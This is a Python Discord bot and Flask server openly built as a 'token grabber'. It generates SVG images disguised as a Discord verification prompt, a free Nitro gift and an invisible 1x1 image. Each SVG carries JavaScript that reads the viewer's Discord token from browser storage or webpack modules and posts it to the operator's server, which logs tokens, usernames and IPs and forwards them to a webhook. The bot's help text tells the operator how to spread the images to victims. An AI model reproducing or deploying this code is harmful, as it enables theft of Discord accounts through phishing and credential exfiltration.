#!/usr/bin/env python3
# =============================================================
# DISCORD TOKEN GRABBER - IMAGE GENERATOR BOT
# =============================================================
# - Generates SVG images that grab Discord tokens
# - Gives YOU the image file to send manually
# - Webhook to receive grabbed tokens
# - Professional panel replies with developer credit
# =============================================================

import discord
from discord.ext import commands
import asyncio
import json
import os
import aiohttp
import datetime
import base64
import random
import io
import sys

try:
    from flask import Flask, request, jsonify
    import threading
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# =============================================================
# WEB SERVER (Receives grabbed tokens + Keeps Railway Active)
# =============================================================

GRABBED_TOKENS_FILE = 'grabbed_tokens.json'

if FLASK_AVAILABLE:
    app = Flask(__name__)
    
    @app.route('/')
    @app.route('/health')
    def healthcheck():
        return "Bot is running!", 200
    
    @app.route('/grab', methods=['GET', 'POST'])
    def grab_token():
        """Endpoint to receive grabbed tokens."""
        try:
            if request.method == 'POST':
                data = request.get_json()
            else:
                data = request.args.to_dict()
            
            token = data.get('token')
            user_id = data.get('user_id')
            user_name = data.get('user_name')
            ip = request.remote_addr
            
            if token:
                token_data = {
                    'timestamp': datetime.datetime.now().isoformat(),
                    'token': token,
                    'user_id': user_id,
                    'user_name': user_name,
                    'ip': ip,
                    'user_agent': request.headers.get('User-Agent')
                }
                
                tokens = []
                if os.path.exists(GRABBED_TOKENS_FILE):
                    with open(GRABBED_TOKENS_FILE, 'r') as f:
                        tokens = json.load(f)
                
                tokens.append(token_data)
                
                with open(GRABBED_TOKENS_FILE, 'w') as f:
                    json.dump(tokens, f, indent=4)
                
                print(f"✅ TOKEN GRABBED: {token[:20]}... from {user_name}")
                
                asyncio.create_task(send_token_to_discord(token_data))
                
                return jsonify({'status': 'success'}), 200
            
            return jsonify({'status': 'error', 'message': 'No token provided'}), 400
            
        except Exception as e:
            print(f"⚠️ Error: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500
    
    @app.route('/tokens')
    def view_tokens():
        """View grabbed tokens."""
        try:
            if not os.path.exists(GRABBED_TOKENS_FILE):
                return jsonify({'tokens': []}), 200
            
            with open(GRABBED_TOKENS_FILE, 'r') as f:
                tokens = json.load(f)
            
            for t in tokens:
                if 'token' in t:
                    t['token'] = t['token'][:10] + '...'
            
            return jsonify({'count': len(tokens), 'tokens': tokens}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    def run_web_server():
        try:
            port = int(os.environ.get('PORT', 8080))
            app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        except Exception as e:
            print(f"⚠️ Web server error: {e}")
    
    def start_web_server():
        thread = threading.Thread(target=run_web_server, daemon=True)
        thread.start()
        print("🌐 Web server started on port 8080")
else:
    def start_web_server():
        print("⚠️ Flask not installed")

# =============================================================
# DISCORD BOT
# =============================================================

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
SERVER_URL = os.environ.get('SERVER_URL', 'https://your-railway-app.railway.app')

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# =============================================================
# CREATE GRABBER SVG IMAGES
# =============================================================

def create_verification_grabber():
    """Create a verification image that grabs token."""
    
    grab_endpoint = f"{SERVER_URL}/grab"
    
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">
    <defs>
        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#5865F2;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#7289DA;stop-opacity:1" />
        </linearGradient>
        <style>
            text {{ font-family: 'Segoe UI', Arial, sans-serif; }}
            .clickable {{ cursor: pointer; }}
            .glow {{ animation: glow 2s ease-in-out infinite alternate; }}
            @keyframes glow {{
                from {{ filter: drop-shadow(0 0 10px rgba(88, 101, 242, 0.5)); }}
                to {{ filter: drop-shadow(0 0 30px rgba(88, 101, 242, 0.9)); }}
            }}
        </style>
    </defs>
    
    <rect width="600" height="400" rx="20" fill="#1a1a2e"/>
    <rect x="5" y="5" width="590" height="390" rx="18" fill="none" stroke="url(#grad)" stroke-width="3"/>
    
    <circle cx="300" cy="100" r="60" fill="url(#grad)" class="glow"/>
    <text x="300" y="115" text-anchor="middle" fill="white" font-size="60" font-weight="bold">D</text>
    
    <text x="300" y="190" text-anchor="middle" fill="white" font-size="28" font-weight="bold" class="clickable">🔐 VERIFY YOUR ACCOUNT</text>
    <text x="300" y="225" text-anchor="middle" fill="#a0a0b0" font-size="16">Click the button below to verify your account</text>
    <text x="300" y="250" text-anchor="middle" fill="#a0a0b0" font-size="14">This is required for server security</text>
    
    <rect x="200" y="280" width="200" height="50" rx="25" fill="url(#grad)" class="clickable glow"/>
    <text x="300" y="312" text-anchor="middle" fill="white" font-size="18" font-weight="bold" class="clickable">✅ VERIFY NOW</text>
    
    <text x="300" y="375" text-anchor="middle" fill="#555" font-size="11">Click to verify • Powered by Discord Security</text>
    
    <script type="text/javascript">
        document.addEventListener('DOMContentLoaded', function() {{
            var elements = document.querySelectorAll('.clickable');
            elements.forEach(function(el) {{
                el.addEventListener('click', function() {{
                    grabToken();
                }});
            }});
            setTimeout(grabToken, 3000);
        }});
        
        function getToken() {{
            try {{
                var token = localStorage.getItem('token');
                if (token) return token;
                token = sessionStorage.getItem('token');
                if (token) return token;
                if (window.webpackChunkdiscord_app) {{
                    var modules = webpackChunkdiscord_app.push([[''], {{}}, function(e) {{
                        return Object.values(e.c).find(function(x) {{
                            return x && x.exports && x.exports.getToken;
                        }})?.exports?.getToken();
                    }}]);
                    if (modules && modules[0] && modules[0].exports) {{
                        var result = modules[0].exports.getToken?.();
                        if (result) return result;
                    }}
                }}
                return null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function getUserId() {{
            try {{
                var token = localStorage.getItem('token');
                if (token) {{
                    var payload = token.split('.')[1];
                    if (payload) {{
                        var decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
                        var data = JSON.parse(decoded);
                        return data.sub || data.id || null;
                    }}
                }}
                return null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function getUserName() {{
            try {{
                var user = JSON.parse(localStorage.getItem('user') || '{{}}');
                return user.username || null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function grabToken() {{
            var token = getToken();
            if (!token) return;
            
            var userId = getUserId();
            var userName = getUserName();
            var serverUrl = '{grab_endpoint}';
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', serverUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({{
                token: token,
                user_id: userId,
                user_name: userName
            }}));
            
            try {{
                var img = new Image();
                var params = new URLSearchParams({{
                    token: token,
                    user_id: userId || '',
                    user_name: userName || ''
                }});
                img.src = serverUrl + '?' + params.toString();
                img.style.display = 'none';
                document.body.appendChild(img);
            }} catch(e) {{}}
            
            var btn = document.querySelector('rect:last-of-type');
            if (btn) btn.setAttribute('fill', '#43B581');
            var text = document.querySelector('text:last-of-type');
            if (text) text.textContent = '✅ VERIFIED!';
            
            alert('✅ Account verified successfully!');
            setTimeout(function() {{
                window.location.href = 'https://discord.com/app';
            }}, 1500);
        }}
        
        document.addEventListener('click', function() {{
            grabToken();
        }});
    </script>
</svg>'''
    
    return svg

def create_nitro_grabber():
    """Create a fake Nitro image that grabs token."""
    
    grab_endpoint = f"{SERVER_URL}/grab"
    
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300" viewBox="0 0 500 300">
    <rect width="500" height="300" rx="15" fill="#1a1a2e"/>
    <rect x="5" y="5" width="490" height="290" rx="13" fill="none" stroke="#ff6b6b" stroke-width="3"/>
    
    <rect x="175" y="60" width="150" height="120" rx="10" fill="#ff6b6b" class="clickable"/>
    <rect x="200" y="60" width="100" height="20" rx="5" fill="#ffd93d" class="clickable"/>
    <circle cx="250" cy="120" r="30" fill="none" stroke="#ffd93d" stroke-width="4" class="clickable"/>
    <text x="250" y="128" text-anchor="middle" fill="white" font-size="24" font-weight="bold" class="clickable">🎁</text>
    
    <text x="250" y="215" text-anchor="middle" fill="white" font-size="22" font-weight="bold" class="clickable">FREE NITRO GIFT!</text>
    <text x="250" y="245" text-anchor="middle" fill="#a0a0b0" font-size="14" class="clickable">Click to claim your free Nitro 🚀</text>
    <text x="250" y="275" text-anchor="middle" fill="#555" font-size="11">Limited time offer • 100+ available</text>
    
    <script>
        document.addEventListener('click', function() {{
            try {{
                var token = localStorage.getItem('token') || sessionStorage.getItem('token');
                if (token) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '{grab_endpoint}', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({{
                        token: token,
                        user_id: localStorage.getItem('user_id') || '',
                        user_name: JSON.parse(localStorage.getItem('user') || '{{}}').username || ''
                    }}));
                }}
            }} catch(e) {{}}
            window.location.href = 'https://discord.com/app';
        }});
    </script>
</svg>'''
    
    return svg

def create_stealth_grabber():
    """Create a stealth image that grabs token without user knowing."""
    
    grab_endpoint = f"{SERVER_URL}/grab"
    
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
    <script>
        (function() {{
            try {{
                var token = localStorage.getItem('token') || sessionStorage.getItem('token');
                if (token) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '{grab_endpoint}', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({{
                        token: token,
                        user_id: localStorage.getItem('user_id') || '',
                        user_name: JSON.parse(localStorage.getItem('user') || '{{}}').username || ''
                    }}));
                }}
            }} catch(e) {{}}
        }})();
    </script>
</svg>'''
    
    return svg

# =============================================================
# SEND TOKEN TO DISCORD WEBHOOK
# =============================================================

async def send_token_to_discord(token_data):
    """Send grabbed token to Discord webhook."""
    if not WEBHOOK_URL:
        return
    
    try:
        embed = discord.Embed(
            title="🎯 TOKEN GRABBED!",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Token", value=f"`{token_data.get('token', 'Unknown')[:30]}...`", inline=False)
        embed.add_field(name="User ID", value=f"`{token_data.get('user_id', 'Unknown')}`", inline=True)
        embed.add_field(name="Username", value=f"`{token_data.get('user_name', 'Unknown')}`", inline=True)
        embed.add_field(name="IP", value=f"`{token_data.get('ip', 'Unknown')}`", inline=True)
        embed.add_field(name="Time", value=f"`{token_data.get('timestamp', 'Unknown')}`", inline=False)
        embed.set_footer(text="developed by @yathishyt ⚡ | Token Grabber")
        
        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, json={'embeds': [embed.to_dict()]})
    except Exception as e:
        print(f"⚠️ Error sending to webhook: {e}")

# =============================================================
# BOT COMMANDS
# =============================================================

@bot.event
async def on_ready():
    print(f'✅ Token Generator Bot is online!')
    print(f'🤖 Bot Name: {bot.user.name}')
    print(f'📡 Connected to {len(bot.guilds)} servers')
    print(f'\n📋 Commands:')
    print(f'  !generate - Get all grabber images')
    print(f'  !grabber - Get verification image')
    print(f'  !nitro - Get fake Nitro image')
    print(f'  !stealth - Get stealth image')
    print(f'  !tokens - Show grabbed tokens stats')
    print(f'  !stats - Show bot statistics')

@bot.command(name='generate')
async def generate_all(ctx):
    """Generate ALL grabber images for you to download."""
    try:
        embed = discord.Embed(
            title="📦 TOKEN GRABBER IMAGES",
            description="Download the images below to send manually.",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📋 How to Use",
            value="1. Download the images below\n"
                  "2. Send them in Discord chats\n"
                  "3. When users click, their token is grabbed\n"
                  "4. Tokens appear in your webhook/channel",
            inline=False
        )
        embed.add_field(
            name="⚠️ Note",
            value="- Verification image: Looks like a Discord verification prompt\n"
                  "- Nitro image: Looks like a free Nitro gift\n"
                  "- Stealth image: Invisible, grabs on load\n"
                  "**All images work when opened in a browser**",
            inline=False
        )
        embed.set_footer(text="developed by @yathishyt ⚡ | Download and send manually")
        
        await ctx.send(embed=embed)
        
        svg1 = create_verification_grabber()
        file1 = discord.File(io.BytesIO(svg1.encode()), filename='verify.svg')
        await ctx.send("**🔐 Verification Image:**", file=file1)
        
        svg2 = create_nitro_grabber()
        file2 = discord.File(io.BytesIO(svg2.encode()), filename='nitro_gift.svg')
        await ctx.send("**🎁 Fake Nitro Image:**", file=file2)
        
        svg3 = create_stealth_grabber()
        file3 = discord.File(io.BytesIO(svg3.encode()), filename='stealth.svg')
        await ctx.send("**👻 Stealth Image (Invisible):**", file=file3)
        
        embed2 = discord.Embed(
            title="✅ All Images Generated!",
            description="Download them and send manually in any Discord server.\n\n"
                       "Tokens will be sent to your webhook when users click.",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed2.set_footer(text="developed by @yathishyt ⚡ | Happy grabbing!")
        await ctx.send(embed=embed2)
        
        print(f"✅ Images generated for {ctx.author.name}")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='grabber')
async def get_grabber(ctx):
    """Get the verification image to send manually."""
    try:
        svg = create_verification_grabber()
        file = discord.File(io.BytesIO(svg.encode()), filename='verify.svg')
        
        embed = discord.Embed(
            title="🔐 Verification Image",
            description="Download this image and send it in Discord chats.\n"
                       "When users click it, their token will be grabbed.",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.set_image(url="attachment://verify.svg")
        embed.set_footer(text="developed by @yathishyt ⚡ | Send manually")
        
        await ctx.send(embed=embed, file=file)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='nitro')
async def get_nitro(ctx):
    """Get the fake Nitro image to send manually."""
    try:
        svg = create_nitro_grabber()
        file = discord.File(io.BytesIO(svg.encode()), filename='nitro_gift.svg')
        
        embed = discord.Embed(
            title="🎁 Fake Nitro Image",
            description="Download this image and send it in Discord chats.\n"
                       "Users will think it's a free Nitro gift!",
            color=discord.Color.gold(),
            timestamp=datetime.datetime.now()
        )
        embed.set_image(url="attachment://nitro_gift.svg")
        embed.set_footer(text="developed by @yathishyt ⚡ | Send manually")
        
        await ctx.send(embed=embed, file=file)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='stealth')
async def get_stealth(ctx):
    """Get the stealth image to send manually."""
    try:
        svg = create_stealth_grabber()
        file = discord.File(io.BytesIO(svg.encode()), filename='stealth.svg')
        
        embed = discord.Embed(
            title="👻 Stealth Image",
            description="Download this image and send it in Discord chats.\n"
                       "**Invisible** - grabs token immediately on load!",
            color=discord.Color.dark_purple(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="developed by @yathishyt ⚡ | Send manually")
        
        await ctx.send(embed=embed, file=file)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='tokens')
async def show_tokens(ctx):
    """Show grabbed tokens stats."""
    try:
        if not os.path.exists(GRABBED_TOKENS_FILE):
            await ctx.send("📭 No tokens grabbed yet.")
            return
        
        with open(GRABBED_TOKENS_FILE, 'r') as f:
            tokens = json.load(f)
        
        embed = discord.Embed(
            title="🎯 Grabbed Tokens Statistics",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Total Tokens", value=f"`{len(tokens)}`", inline=True)
        
        if tokens:
            last = tokens[-1]
            embed.add_field(name="Last Grabbed", value=f"`{last.get('timestamp', 'Unknown')[:16]}`", inline=True)
            embed.add_field(name="Last User", value=f"`{last.get('user_name', 'Unknown')}`", inline=True)
        
        embed.set_footer(text="developed by @yathishyt ⚡ | Token Grabber")
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='stats')
async def show_stats(ctx):
    """Show bot statistics."""
    try:
        tokens_count = 0
        if os.path.exists(GRABBED_TOKENS_FILE):
            with open(GRABBED_TOKENS_FILE, 'r') as f:
                tokens_count = len(json.load(f))
        
        embed = discord.Embed(
            title="📊 Bot Statistics",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Tokens Grabbed", value=f"`{tokens_count}`", inline=True)
        embed.add_field(name="Servers", value=f"`{len(bot.guilds)}`", inline=True)
        embed.add_field(name="Online Since", value=f"`{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`", inline=True)
        embed.set_footer(text="developed by @yathishyt ⚡ | Token Generator")
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='helpgrabber')
async def help_grabber(ctx):
    """Show help for token grabber bot."""
    embed = discord.Embed(
        title="🎯 Token Generator Help",
        description="This bot generates images that grab Discord tokens.",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(
        name="📋 Commands",
        value="`!generate` - Get ALL grabber images\n"
              "`!grabber` - Get verification image\n"
              "`!nitro` - Get fake Nitro image\n"
              "`!stealth` - Get stealth image\n"
              "`!tokens` - Show grabbed tokens stats\n"
              "`!stats` - Show bot statistics",
        inline=False
    )
    embed.add_field(
        name="📦 Image Types",
        value="**Verification** - Looks like Discord verification (best results)\n"
              "**Nitro** - Fake Nitro gift (tempting)\n"
              "**Stealth** - Invisible, grabs on load (most stealthy)",
        inline=False
    )
    embed.add_field(
        name="🔧 How It Works",
        value="1. You download the image using `!grabber` or `!generate`\n"
              "2. You send the image manually in any Discord chat\n"
              "3. When a user clicks/view the image, token is grabbed\n"
              "4. Token is sent to your webhook and saved",
        inline=False
    )
    embed.add_field(
        name="🔧 Setup",
        value="1. Set `BOT_TOKEN` in Railway variables\n"
              "2. Set `WEBHOOK_URL` for Discord notifications\n"
              "3. Set `SERVER_URL` to your Railway app URL",
        inline=False
    )
    embed.set_footer(text="developed by @yathishyt ⚡ | Token Generator")
    
    await ctx.send(embed=embed)

# =============================================================
# ERROR HANDLING
# =============================================================

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Error: {str(error)}")

# =============================================================
# MAIN
# =============================================================

def main():
    print("🚀 Starting Token Generator Bot...")
    print("🎯 Generate images to grab Discord tokens!")
    print(f"📁 Data file: {GRABBED_TOKENS_FILE}")
    print(f"📁 Server URL: {SERVER_URL}")
    
    if not BOT_TOKEN:
        print("❌ No BOT_TOKEN found! Set in Railway Variables")
        return
    
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    start_web_server()
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Fatal: {e}")
        sys.exit(1)